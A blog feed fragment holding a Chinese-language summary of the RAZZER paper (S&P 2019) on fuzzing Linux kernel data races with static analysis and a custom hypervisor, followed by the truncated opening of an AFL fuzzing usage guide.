    <content type="html"><![CDATA[<p>出处：S&amp;P 2019 </p><p>作者：Dae R. Jeong, Kyungtae Kim, Basavesh Shivakumar, Byoungyoung Lee, Insik Shin </p><p>单位：Computer Science, KAIST, Computer Science, Purdue University, Electrical and Computer Engineering, Seoul National University </p><p>资料：<a href="https://github.com/fengjixuchui/FuzzingPaper/blob/master/Paper/SP19_Razzer.pdf" target="_blank" rel="noopener">Paper</a> </p><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>内核中的数据竞争是一类严重的bug，会影响相关系统的可靠性和安全性。利用内核中的竞争，简单的可以是内核变得没有响应， 严重的则会触发权限提升攻击以获取root权限。</p><p>本文将主要基于RAZZER，一种在内核中查找竞争漏洞的工具，来介绍对内核数据竞争漏洞的模糊测试。一般的模糊测试是通过输入畸形数据来触发目标程序的崩溃进而再通过手动分析确定是否存在安全问题的，但是这种方式不仅很难对竞争漏洞进行针对性测试，而且很难发现由于竞争漏洞而导致的潜在安全问题。与传统方案的不同，RAZZER的核心思想是引导Fuzzing工具去执行可能存在数据竞争漏洞的代码。具体来说就是采用静态分析和确定性线程交错技术。静态分析技术来对潜在的内核数据竞争点进行定位，从而引导Fuzz器更有效地对内核中的数据竞争点进行Fuzz。确定性线程交错技术则是用来控制线程调度，以提供精确的并行执行信息，降低不确定性，从而保证内核竞争的稳定触发。但是此项工作并没有解决同步机制对多线程模糊测试的影响。</p><h2 id="I-介绍"><a href="#I-介绍" class="headerlink" title="I 介绍"></a>I 介绍</h2><p>数据竞争对底层系统的可靠性和安全性会造成影响，具体来说主要是以下三个方面：</p><ol><li>如果数据竞争引入了循环锁定行为，则由于导致的死锁，造成内核无响应。</li><li>如果出现在内核中的安全断言，内核将自行重启，从而导致拒绝服务。</li><li>数据竞争还可能会导致严重的安全攻击，比如触发缓冲区溢出或者UAF等类型的漏洞进而导致权限提升攻击。例如CVE-2016-8655 [1]，CVE-2017-2636 [2]和CVE-2017-17712 [3]。</li></ol><p>因为数据竞争源于内核的非确定性行为，所以研究数据竞争不仅需要精确的控制流和数据流信息，还需要精确的并发执行信息，这些信息受到底层系统的许多其他外部因素（例如调度，同步原语等）的严重影响。</p><p>本文介绍的RAZZER首先进行使用LLVM传递实现了静态分析以获得潜在数据竞争点，之后针对这些竞争点执行两次动态模糊测试。第一次是单线程模糊测试，其重点是找到执行潜在竞争点的单线程输入程序（不考虑程序是否确实触发了竞争）。第二次是多线程模糊测试，使用自建的多线程程序，进一步利用修改QEMU和KVM开发的管理程序来促使其在潜在数据竞争点的执行。因此，RAZZER能够避免外部因素的影响使竞争行为稳定触发。</p><p>RAZZER的主要特点如下：</p><ol><li>面向竞争的Fuzzer：这是一种新的模糊测试机制，专门用于检测内核中的竞争。 它利用静态和动态分析技术将其模糊测试集中在潜在的竞争点上。</li><li>强大的实现：基于各种行业优势框架实施了RAZZER，主要是KVM / QEMU和LLVM。 它不需要手动修改要分析的目标内核，从而可以轻松支持最新的Linux内核而无需任何人工干预。</li><li>实际效果：RAZZER发现了30个竞争漏洞，其中16个已经被确认，并由相应的内核开发人员进行相应的修复。 </li></ol><h2 id="II-问题定义-amp-设计需求"><a href="#II-问题定义-amp-设计需求" class="headerlink" title="II 问题定义&amp;设计需求"></a>II 问题定义&amp;设计需求</h2><h3 id="A-问题定义"><a href="#A-问题定义" class="headerlink" title="A.问题定义"></a>A.问题定义</h3><p>当目标程序中的两个存储器访问指令满足以下三个条件时，发生数据竞争：<br>（i）访问的内存地址相同。<br>（ii）至少其中一条指令是对内存的写。<br>（iii）两条指令可以并发执行。<br>数据竞争并不都会触发漏洞，有些是开发人员预期的（或有意的）数据竞争，容忍计算结果的潜在偏差。只有那些会触发非预期行为的数据竞争才会触发漏洞。此处引入如下四个术语来进行标识：<br>RacePaircand 可能导致竞争的两个内存访问指令<br>RacePairtrue 两个被确认引起竞争的指令<br>RacePairbenign 预期的数据竞争<br>RacePairharm 会触发漏洞的非预期数据竞争</p><p>此处以竞争漏洞CVE-2017-2636作为示例来阐述数据竞争是如何发生的并且发生之后将会触发什么危害。此漏洞的详情如图1所示，造成漏洞的原因是本应是一个特定顺序的系统调用的特定列表，但却因为一个对抗的多线程用户程序引发了数据竞争，最终在内核处理此类系统调用，比如ioctl和write时导致了double-free问题。</p><p><img src="https://i.loli.net/2019/06/30/5d18b5a88ce6d62057.png" alt="8CEEBBC7-64F3-4B76-ACDB-C930AC6C60FB.png"></p><p>图1：关于CVE-2017-2636的简化竞争示例。 当用户程序同时执行两个系统调用时，n_hdlc-&gt; tbuf上的数据竞争可能会发生，但具体要取决于执行顺序，这会情况会导致double-free问题，从而允许攻击者启动权限提升攻击。</p><h3 id="B-设计需求"><a href="#B-设计需求" class="headerlink" title="B.设计需求"></a>B.设计需求</h3><p><strong>设计要求</strong> 为了避免检测竞争过程中出现任何误报，确定出以下两个理想的设计要求：</p><p>R1：找到执行RacePaircand的输入程序。 更确切地说，分析应该发现一个多线程用户程序，程序中的每个线程执行RacePaircand中的每个指令。<br>R2：找到同时执行RacePaircand的输入程序的线程交错。</p><p>之所以要满足这两个设计要求是因为单独的R1不能确保可以同时执行RacePaircand以触发数据竞争，因此分析应该识别同时执行RacePaircand的特定线程交错情况。</p><p><strong>需求研究–传统的模糊测试</strong> 传统的模糊测试专注于对R1的解决，试图找到扩展内核代码覆盖范围的输入。由于根本不考虑R2，因此发现数据竞争基本都是无效的。</p><p><strong>需求研究–线程交叉工具</strong> 关于随机线程交错工具（例如SKI [4]或PCT算法[5]），他们的重点是满足R2，试图探索特定（和静态）输入程序的所有可能的线程交错情况。由于他们不考虑R1，因此他们只能运行现有程序（例如基准测试），因此无法有效地探索大量代码空间，导致大部分内核未经测试。此外，因为线程交错工具基于随机调度，所以它们单独对R2的效率（即简单地搜索所有线程交错情况）也受到严重限制。</p><h2 id="III-设计-amp-实现"><a href="#III-设计-amp-实现" class="headerlink" title="III. 设计&amp;实现"></a>III. 设计&amp;实现</h2><p>RAZZER背后的关键理念是采用动静混合测试方案来对内核中潜在数据竞争点的分析。首先，RAZZER执行静态分析以获得十分近似的潜在数据竞争点。之后，RAZZER进行两阶段动态分析。第一阶段是单线程模糊测试，其重点是识别执行潜在竞争点（尝试满足R1）的单线程输入程序。第二阶段是多线程模糊测试。第二阶段在第一阶段的帮助下构建多线程程序，利用自定义管理程序确定性地控制线程交错（尝试满足R2）。找到竞争之后，RAZZER就会输出一个具体的用户程序（即触发数据竞争的程序）。Razzer还会检测内核是否出现了错误，如果RacePairtrue在程序后续执行过程中，导致了内核错误，则得到了一个RacePairharm。</p><p><img src="https://i.loli.net/2019/06/30/5d18b5cea1ddc33409.png" alt="CE56457C-84BA-4FD7-B52C-7F73DB09332B.png"></p><p>图2：RAZZER的整体架构</p><h3 id="A-静态分析识别潜在竞争点"><a href="#A-静态分析识别潜在竞争点" class="headerlink" title="A. 静态分析识别潜在竞争点"></a>A. 静态分析识别潜在竞争点</h3><p>静态分析的目标是识别内核中的所有RacePaircand，其中每个RacePaircand由两个内存访问指令组成，并且可能需要在运行时竞争。RAZZER在此处使用的是点对分析，但是一般而言点对分析在准确性和性能方面受到限制，并且会具有很高的误报率，因此RAZZER在此采用特有的方式对这个问题来进行解决。</p><p>首先是为了解决准确性问题，RAZZER允许点分析十分逼近RacePaircand集（即，某些RacePaircand可能不是RacePairtrue），并通过其动态模糊测试解决误报问题。其次，为了缓解性能问题，RAZZER执行内核的定制分区分析。 它根据模块组件对内核对象进行分区，并对每个模块执行预分析。 并且在对每个模块执行预分析时，RAZZER也始终提供核心内核模块。</p><p>值得注意的一点是，此处的静态分析不考虑内核中的同步原语（例如，read_lock()，br_read_lock()，spin_lock_irqsave()，up()）。利用这些信息可以降低误报率（因为它可以帮助确定不能竞争的内存对）。</p><h3 id="B-Hypervisor中的每核心调度程序"><a href="#B-Hypervisor中的每核心调度程序" class="headerlink" title="B. Hypervisor中的每核心调度程序"></a>B. Hypervisor中的每核心调度程序</h3><p>由于内核线程交错的非确定性和随机性，竞争条件很少表现出来。因此，RAZZER在定制的虚拟化环境中运行目标内核，以便RAZZER避免来自外部事件的非确定性行为。具体来说就是 RAZZER修改虚拟机管理程序为guest内核提供了以下功能：</p><ol><li>为每个CPU核心设置一个断点:RAZZER提供了一个新的超级调用接口hcall_set_bp()，以便guest内核可以根据需要设置每个核心的断点。这个超级调用接口会在虚拟机guest内核使用两个参数时如下来个参数时被调用。<br>(1) vCPU_ID指定RAZZER应在其上安装断点的虚拟CPU（vCPU）;<br>(2) guest_addr指定客户操作系统的地址空间中要安装断点的地址。<br>收到此超级调用后，虚拟机管理程序会在guest_addr上安装硬件断点，该断点仅对指定的vCPU有效。</li><li>在guest内核遇到断点后恢复执行内核线程:在两个客户内核线程停在它们各自的断点地址（即RacePaircand）之后，RAZZER恢复两个vCPU的执行，使得两个线程同时执行RacePaircand。 RAZZER在这里做出的一个重要决定是：应该首先恢复哪个内核线程？这对于识别数据竞争非常重要，因为某些竞争bug仅在特定执行任务上展示。恢复的工作流程如图3所示。</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b5e89fc7f54203.png" alt="5E705F2C-2A22-49B7-84DA-E6F804C3895A.png"></p><p>图3：RAZZER管理程序的工作流程</p><ol start="3"><li>检查guest内核是否确实发生了竞争:当两个断点同时被触发时，我们的管理程序检查给定的RacePaircand是否实际导致竞争。 更具体地说，当RacePaircand中的两个存储器指令都命中断点时，我们的管理程序会对这些指令要访问的目标地址进行分析。 如果这些地址相同，那么RAZZER会得出结论，给定的RacePaircand真正参加竞争，将这样的一对推广到RacePairtrue。 从技术上讲，我们的虚拟机管理程序通过反汇编每个RacePaircand位置的指令并获得存储在每个vCPU中的具体寄存器值来计算目标地址值。</li></ol><h3 id="C-通过两个阶段的Fuzz来发现竞争漏洞"><a href="#C-通过两个阶段的Fuzz来发现竞争漏洞" class="headerlink" title="C. 通过两个阶段的Fuzz来发现竞争漏洞"></a>C. 通过两个阶段的Fuzz来发现竞争漏洞</h3><p>RAZZER的模糊测试分两个阶段进行：<br>（i）单线程模糊测试阶段找到一个触发任何RacePaircand的单线程用户程序;<br>（ii）多线程模糊测试阶段最终找到一个多线程用户程序，该程序根据单线程阶段的结果触发一次攻击竞争。<br>要注意每个模糊测试阶段由两个组件组成，即生成器和执行器，其中生成器创建用户程序，然后执行程序运行程序。</p><p>1）单线程模糊测试：在这个阶段，单线程生成器最初生成Pst，一个带有一系列随机系统调用的单线程程序。 接下来，单线程执行程序运行每个Pst，同时测试Pst的每次执行是否会覆盖RacePaircand。如果覆盖，则单线程执行程序将Pst（带有被覆盖RacePaircand的信息注释）传递给下一阶段来进行多线程模糊测试。</p><p><strong>单线程生成器</strong> 单线程生成器构造一个单线程用户程序（我们称之为Pst），执行一系列随机系统调用来测试内核的行为。 RAZZER使用以下两种策略构建Pst：生成和变异。 使用生成策略时，RAZZER会根据预定义的系统调用语法随机生成Pst。 此系统调用语法包括所有可用的系统调用以及每个系统调用的一系列合理参数值。 遵循此语法，RAZZER尝试通过随机选择一系列系统调用来构建合理的用户程序。 然后它随机填充每个系统调用的参数，并将其返回值随机地捎带到跟随系统调用的参数上。与生成相反，突变随机改变现有的Pst。 它可能会随机丢弃Pst中的一些系统调用，插入新的系统调用或更改某些参数值。</p><p><strong>单线程执行程序</strong> 给定来自生成器的Pst，单线程执行器在执行以下两个任务时运行每个Pst。 首先，如果Pst的执行覆盖任何RacePaircand中的两个存储器访问指令，则RAZZER将这样匹配的RacePaircand信息注释到Pst。 然后RAZZER将这个带注释的Pst传递给多线程生成器，以便可以进一步检查它是否正在竞争。</p><p>2）多线程模糊测试：在单线程模糊测试阶段后，RAZZER进入多线程模糊测试阶段。 对于每个RacePaircand，多线程生成器将Pst转换为Pmt，Pst的多线程版本。 Pmt还配备了管理程序调用，以在给定的RacePaircand上确定性地触发竞争。 最后，多线程执行程序运行每个Pmt。 如果Pmt被确认为由管理程序触发竞争，则RAZZER将相应的RacePaircand提升为RacePairtrue，并通过将其反馈给生成器来继续改变Pmt。 此外，如果Pmt能够触发内核崩溃，RAZZER则会生成一份有关已识别的有害竞争的详细报告。</p><p><strong>多线程生成器</strong> 多线程生成器使用带注释的Pst（包括RacePaircand）作为输入。 然后输出Pmt，也就是Pst的多线程版本，同时输入带注释的RacePaircand信息利用超级调用确定性地触发竞争。由Pst转换为Pmt的程序如图4所示</p><p><img src="https://i.loli.net/2019/06/30/5d18b602c5d8827167.png" alt="4D28506F-9E98-4E29-9524-FA4A34DC6591.png"></p><p>图5：RAZZER的多线程生成器算法</p><p>当Pmt中的RacePaircand指令都触发断点时，Razzer会检查访存指令的访问地址是否相同，如果相同，则判定为RacePairtrue。可以注意到在Pmt的最后加入了一些随机的syscall，这是为了当数据竞争造成了具有攻击效果的后果时，让程序报错。每当检测到一个RacePairtrue，就会把结果反馈回生成算法，并保持前面的代码不变，只修改后续随机添加的syscall，进行新的Fuzz。如果其中某个Pmt使kernel报错，则认为是发现了一个RacePairharm。</p><p><strong>多线程执行程序</strong> 多线程执行程序的主要作用是运行Pmt以测试RacePaircand是否真正触发了竞争。 在运行时，它会在调用相应的racy系统调用之前，利用超级调用在RacePaircand指令中设置每核断点。 然后，hcall_check_race()通过同时检查以下两个条件来确定是否真正触发了竞争：<br>（1）如果管理程序确实捕获了两个断点；<br>（2）RacePaircand指令访问的具体内存地址是相同的。</p><p>要注意引起真正的竞争本身并不一定意味着有害的竞争，RAZZER会在竞争后触发系统调用，以便从各种竞争中辨别出有害的竞争。 大多数现代内核使用运行时竞争检测机制来检查是否发生了有害竞争。 例如，Linux内核使用各种动态技术来检测有害的竞争。 示例是lockdep[6]，KASAN [7]或由内核开发人员手动插入的断言。 我们在构建内核二进制文件时启用了所有这些技术，以便RAZZER可以利用这种增强的竞争检测功能。</p><p>RAZZER的一个重要特征是它向Pmt上的多线程生成器提供反馈，导致真正的竞争（即使是良性竞争），这样Pmt可以进一步变异，但仅限于与竞争后行为相关的部分。</p><h3 id="D-实现"><a href="#D-实现" class="headerlink" title="D. 实现"></a>D. 实现</h3><ol><li>RAZZER的静态分析基于LLVM 4.0.0和SVF[8]。</li><li>RAZZER的虚拟机管理程序在QEMU 2.5.0上实现，并利用KVM（基于内核的虚拟机）来利用硬件加速。</li><li>RAZZER的模糊器是基于Syzkaller[9]实现的。</li></ol><h2 id="IV-评估"><a href="#IV-评估" class="headerlink" title="IV. 评估"></a>IV. 评估</h2><p>在评估之前首先要准备好目标内核，RAZZER不需要手动修改要分析的目标内核，它只需要先使用LLVM和GCC对目标进行build，之后运行在RAZZER的hypervisor虚拟机上即可。</p><ol><li>图5总结了RAZZER确定的竞争漏洞。</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b61b13acd91907.png" alt="60EEAB57-10C6-45BB-BCCA-7A14B2528780.png"></p><p>图5：RAZZER新发现可以造成安全缺陷的竞争漏洞清单</p><ol start="2"><li>图6展示了RAZZER发现新的有害竞争的效率。在这个图中，主要描绘了两类bug：（i）通过单线程模糊测试发现的非竞争bug; （ii）通过多线程模糊测试发现的竞争bug。</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b62f4991954310.png" alt="80335BF3-5851-4D38-A49C-751272C623E7.png"></p><p>图7：随时间变化的唯一崩溃次数</p><ol start="3"><li>为了证明RAZZER分区分析的有效性，作者测量了从整个内核获取所有RacePairscand所需的时间，如图8所示。</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b6444f5a458116.png" alt="8D7C37A3-6D05-4F8A-A2F5-CAEC90794E3A.png"></p><p>图8：RAZZER静态分析的性能</p><ol start="4"><li>鉴于RAZZER利用超级调用来启用vCPU的确定性行为，因此需要额外的开销来与管理程序进行通信。为了了解由于管理程序引起的开销，测量了每次超级调用的经过时间100M次并计算了平均值。图9显示了RAZZER的超级调用的性能开销。</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b6566afad24683.png" alt="BC14696C-9949-4936-BB5B-E5C7487E06C2.png"></p><p>图9：执行RAZZER的超级调用时的性能开销</p><ol start="5"><li>模糊测试的执行吞吐量可能是模糊技术效率的间接测量，但更直接和重要的测量应该是找到bug所需的时间（即本文中的有害竞争）。 为了证明这一点，我们测量了发现以前已知的有害竞争CVE-2017-2636，CVE-2016-8655和CVE2017-17712所需的执行次数，同时运行了10个小时。如图10所示，RAZZER发现所有这些以前已知的竞争具有合理的执行次数（即从246 K到1,170 K）以及在合理的时间内（即从7分钟到26分钟）。 然而，Syzkaller未能找到所有这些案例，尽管在10小时内从5 M到37 M生成/突变程序执行。 特别是基于这些CVE案例，表明RAZZER比Syzkaller更快，至少为23至85倍。</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b66b3b52350327.png" alt="21F6932C-A538-4609-B7E9-C3977510B3B7.png"></p><p>图10：Syzkaller和RAZZER在查找触发竞争的用户程序时的效率。 作者测量了执行总次数和找到之前已知竞争所需的时间。 RAZZER在合理的时间内找到了所有已知的竞争，而Syzkaller在10小时的给定时间内没有发现任何竞争（v4.8）。</p><ol start="6"><li>图11显示了在运行RAZZER和SKIEmu时触发每个竞争所需的执行次数。 由于RAZZER仅探索与RacePairscand相关的线程交错（通过运行给定的用户程序发现），因此探索的线程交错情况要少得多，RAZZER所需的执行次数远少于SKIEmu，范围从30次减少到398次。 这个结果还表明，SKIEmu探索的许多线程交错案例与竞争无关，这标志着RAZZER在满足R2方面的有效性。</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b67e85ebe59307.png" alt="90A08220-0F1A-4C50-81A8-5B4F79A34399.png"></p><p>图11：SKIEmu和RAZZER在揭示触发竞争的线程交错方面的效率。 Found列显示了查找交错所需的执行次数（通过重复实验5次并计算平均值获得），Total列显示每个工具所需的理论最大执行次数（v4.8）。</p><h2 id="V-相关工作"><a href="#V-相关工作" class="headerlink" title="V. 相关工作"></a>V. 相关工作</h2><p>面向内核的Fuzzing测试的主要思想是通过给内核驱动输入大量畸形数据，观察操作系统对这些畸形数据处理后的反应，如果出现了蓝屏或者崩溃等信息，则再对dump信息进行静态分析定位漏洞[10]。这类工具如IOCTL、Syzkaller等。此节将主要介绍那些能够识别（或协助识别）数据竞争的技术。</p><p><strong>动态模糊测试</strong> 最近的许多研究表明，模糊测试是一种很有前途的技术，用于发现用户程序中[11]和内核[12]的bug。 模糊测试的关键优势不仅在于该方法可以有效地发现目标程序中的bug，而且还可以避免误报，因为它会产生再现bug的输入。 然而，据我们所知，所有模糊测试技术在用于识别竞争bug时效率低下，主要是因为他们的设计不适合竞争。 虽然大多数模糊器专注于利用先前探索的执行覆盖，但他们不考虑线程交错。 与这些相比，本文介绍的RAZZER则综合考虑了执行覆盖和线程交错从而更有效地发现数据竞争。</p><p><strong>动态线程调度程序</strong> 一些研究例如试图通过实现随机化每线程执行调度的定制线程调度器来找到引起竞争的线程交错的实例。 特别是，PCT算法[13]和SKI [4]通过探索所有可能的线程交错情况来发现用户程序或内核中的竞争。 这两种方法的局限性是：（i）他们不生成（或改变）输入程序，因此它找不到触发数据竞争的新程序; （ii）它们无法找到同时执行RacePaircand的输入程序的线程交错，因为它们必须搜索所有可能的线程交错情况的非常大的空间。 事实上，RAZZER的设计灵感来自PCT算法和SKI它通过定制模糊过程来满足R1，同时通过对RacePairscand进行优先搜索来有效地满足R2。</p><p><strong>动态竞争检测器</strong> 许多研究[14]试图通过收集关于竞争的丰富的上下文信息来改善运行时的竞争检测能力。 这些基本上与RAZZER正交，也就是说它们与RAZZER一起部署后，RAZZER的竞争检测能力也可以得到增强。</p><p>特别是，ThreadSanitizer [15]是由谷歌开发的企业级竞争检测器，最近也应用在了Linux内核发布之前的检测。 为了在检测竞争时增强性能，TxRace [16]利用硬件事务存储器，ProRace [17]利用性能监控单元。 存储器采样技术有选择地监视存储器访问以优化性能。 RaceMob [18]从静态分析生成的潜在数据竞争中众包运行时竞争测试。 Snorlax [19]建议使用粗略交错假设来利用粗粒度定时信息来确定事件的线程交错。</p><p><strong>静态分析</strong> 静态分析已被广泛用于发现未知的bug。在此类别中，我们将重点讨论与竞争bug检测或点对分析实施相关的静态分析工作。 Relay [20]是一个静态的竞争检测器，适用于内核等大型程序。 Relay通过执行基于锁定的自下而上分析生成RacePairscand，同时总结每个函数的行为。 RacerX [21]也可用于查找大型复杂多线程系统的竞争条件和死锁。由于单独使用静态分析技术的局限性，这些基本上导致高的误报率（例如，Relay在Linux内核上显示出84％的误报率），严重限制了它们在实践中的使用。然而，RAZZER还利用动态分析技术，解决了高误报率的可能性。在点对分析实施方面，最近提出了K-miner [22]，通过程序间和上下文敏感性分析揭示商品操作系统中的内存损坏漏洞。 RAZZER的静态分析是基于K-miner的实现而构建的，但经过修改以通过点分析来识别RacePairscand。</p><h2 id="VI-讨论"><a href="#VI-讨论" class="headerlink" title="VI.讨论"></a>VI.讨论</h2><p><strong>静态分析中的漏报</strong>  由于RAZZER依赖于静态分析的结果，如果RacePaircand中缺少任何真正的竞争对，则会导致RAZZER对bug的漏报。 静态分析的这种丢失情况可能主要是因为分区分析发生的。 因为RAZZER的分区分析基于跨越不同内核模块的竞争很少发生（例如，文件系统和终端设备驱动程序）这个假设。 因此，如果假设的情况发生了，RAZZER的RacePaircand将不会包含这样的竞争对，从而导致漏报。要解决这个问题，可以去除RAZZER的分区分析，采用更精确的静态分析技术。</p><p><strong>将RAZZER应用于其他系统</strong>  RAZZER是一种灰盒模糊测试，所以只要源代码和对应的虚拟环境的支持，将RAZZER应用于其他现代操作系统（如Windows，MacOSX，FreeBSD，以及一些开源内核）是很容易的。 从介绍以及开源的代码上来看RAZZER只是在处理系统调用调用模型的时候是针对Linux的，其余所有设计都是平台无关的，因为其核心机制可以离线（即静态分析）或透明（即定制执行系统管理程序）。</p><p><strong>变异策略</strong>  如果将RAZZER测试内核竞争漏洞的思想应用于用户程序，可能不需要在识别竞争后再使用其他变异策略。 因为与偶尔允许使用竞争提高性能的Linux内核不同，大多数用户程序中都会存在数据竞争这样的bug。</p><h2 id="VII-结论"><a href="#VII-结论" class="headerlink" title="VII.结论"></a>VII.结论</h2><p>本文基于RAZZER这种结合静态分析和动态模糊测试的方案，来对内核竞争漏洞的模糊测试技术做了介绍。RAZZER是一款为竞争漏洞量身定制的模糊测试工具，不仅其实现方案极具代表性，其实的实际效果也非常的好。 它利用静态分析来发现潜在的数据竞争点，以指导模糊器识别竞争。 此外，它修改底层管理程序以确定性地触发竞争。 对RAZZER的评估证明了其强大的检测竞争的能力。 它已经在Linux内核中发现了30个新的竞争，并且与其他最先进的工具（特别是Syzkaller和SKI）进行了比较研究，证明了它在检测内核中的竞争漏洞方面的出色表现。</p><h2 id="REFERENCES"><a href="#REFERENCES" class="headerlink" title="REFERENCES"></a>REFERENCES</h2><p>[1] MITRE. CVE-2016-8655., 2016. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8655" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8655</a>.</p><p>[2] MITRE. CVE-2017-2636., 2017. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-2636" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-2636</a>.</p><p>[3] MITRE. CVE-2017-17712., 2017. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17712" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17712</a>.</p><p>[4] Fonseca P , Rodrigues R , Björn B. Brandenburg. SKI: exposing kernel concurrency bugs through systematic schedule exploration[C]// Usenix Conference on Operating Systems Design &amp; Implementation. USENIX Association, 2014.</p><p>[5] Burckhardt S , Kothari P , Musuvathi M , et al. A randomized scheduler with probabilistic guarantees of finding bugs[J]. ACM SIGARCH Computer Architecture News, 2010, 38(1):167.</p><p>[6] I. Molnar. Runtime locking correctness validator, 2018. <a href="https://www.kernel.org/doc/Documentation/locking/lockdep-design.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/locking/lockdep-design.txt</a>.</p><p>[7] Kernel address sanitizer, 2018. <a href="https://github.com/google/kasan/wiki" target="_blank" rel="noopener">https://github.com/google/kasan/wiki</a>.</p><p>[8] Sui Y , Xue J . [ACM Press the 25th International Conference - Barcelona, Spain (2016.03.17-2016.03.18)] Proceedings of the 25th International Conference on Compiler Construction - CC 2016 - SVF: interprocedural static value-flow analysis in LLVM[J]. 2016:265-266.</p><p>[9] D. Vyukov. Syzkaller, 2015. <a href="https://github.com/google/syzkaller" target="_blank" rel="noopener">https://github.com/google/syzkaller</a>.</p><p>[10] 史记, 曾昭龙, 杨从保, et al. Fuzzing 测试技术综述[J]. 信息网络安全, 2014(3):87-91.</p><p>[11] Pham V T , Roychoudhury A . Coverage-based Greybox Fuzzing as Markov Chain[C]// Acm Sigsac Conference on Computer &amp; Communications Security. ACM, 2016.</p><p>[12] You W , Zong P , Chen K , et al. SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits[C]// Acm Sigsac Conference. ACM, 2017.</p><p>[13] Burckhardt S , Kothari P , Musuvathi M , et al. A randomized scheduler with probabilistic guarantees of finding bugs[J]. ACM SIGARCH Computer Architecture News, 2010, 38(1):167.</p><p>[14] Veeraraghavan K , Chen P M , Flinn J , et al. Detecting and Surviving Data Races using Complementary Schedules[C]// Proceedings of the 23rd ACM Symposium on Operating Systems Principles 2011, SOSP 2011, Cascais, Portugal, October 23-26, 2011. ACM, 2011.</p><p>[15] Serebryany K , Iskhodzhanov T . ThreadSanitizer: data race detection in practice[C]// Workshop on Binary Instrumentation &amp; Applications. ACM, 2009.</p><p>[16] Zhang T , Lee D , Jung C . TxRace: Efficient Data Race Detection Using Commodity Hardware Transactional Memory[J]. Acm Sigplan Notices, 2016, 50(2):159-173.</p><p>[17] Zhang T , Jung C , Lee D . ProRace: Practical Data Race Detection for Production Use[J]. Acm Sigarch Computer Architecture News, 2017, 45(1):149-162.</p><p>[18] Kasikci B , Zamfir C , Candea G . RaceMob: Crowdsourced data race detection[C]// Proceedings of the Twenty-Fourth ACM Symposium on Operating Systems Principles. ACM, 2013.</p><p>[19] Kasikci B , Cui W , Ge X , et al. [ACM Press the 26th Symposium - Shanghai, China (2017.10.28-2017.10.28)] Proceedings of the 26th Symposium on Operating Systems Principles, - SOSP \”17 - Lazy Diagnosis of In-Production Concurrency Bugs[J]. 2017:582-598.</p><p>[20] Voung J W , Jhala R , Lerner S . RELAY: static race detection on millions of lines of code[C]// Proceedings of the 6th joint meeting of the European Software Engineering Conference and the ACM SIGSOFT International Symposium on Foundations of Software Engineering, 2007, Dubrovnik, Croatia, September 3-7, 2007. ACM, 2007.</p><p>[21] Engler D . RacerX : Effective, static detection of race conditions and deadlocks[C]// Proc. ACM Symposium Operating Systems Principles, 2003. ACM, 2003.</p><p>[22] D. Gens, S. Schmitt, L. Davi, and A.-R. Sadeghi. K-miner: Uncovering memory corruption in linux. In Proceedings of the 2018 Annual Network and Distributed System Security Symposium (NDSS), San Diego, CA, Feb. 2018.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;出处：S&amp;amp;P 2019 &lt;/p&gt;
&lt;p&gt;作者：Dae R. Jeong, Kyungtae Kim, Basavesh Shivakumar, Byoungyoung Lee, Insik Shin &lt;/p&gt;
&lt;p&gt;单位：Computer Science, KAIS
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>AFL使用指南</title>
    <link href="http://zer0yu.github.io/2019/05/15/how-to-use-afl-fuzz/"/>
    <id>http://zer0yu.github.io/2019/05/15/how-to-use-afl-fuzz/</id>
    <published>2019-05-15T13:41:00.000Z</published>
    <updated>2019-05-15T15:28:07.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>二进制分析方面主要利用技术包括：动态分析(Dynamic Analysis)、静态分析(Static Analysis)、符号化执行(Symbolic Execution)、Constraint Solving、资讯流追踪技术(Data Flow Tracking)以及自动化测试(Fuzz Testing)</p><p>AFL原理介绍参考：<br><a href="https://www.freebuf.com/articles/system/191536.html" target="_blank" rel="noopener">《AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing》</a></p><p>本指南使用的环境是 kali linux 2019.1</p><h2 id="0x01-AFL的基本使用"><a href="#0x01-AFL的基本使用" class="headerlink" title="0x01 AFL的基本使用"></a>0x01 AFL的基本使用</h2><h3 id="1-使用afl-gcc"><a href="#1-使用afl-gcc" class="headerlink" title="1. 使用afl-gcc"></a>1. 使用afl-gcc</h3><h4 id="1-1-使用AFL插桩程序"><a href="#1-1-使用AFL插桩程序" class="headerlink" title="1.1 使用AFL插桩程序"></a>1.1 使用AFL插桩程序</h4><p>目标程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 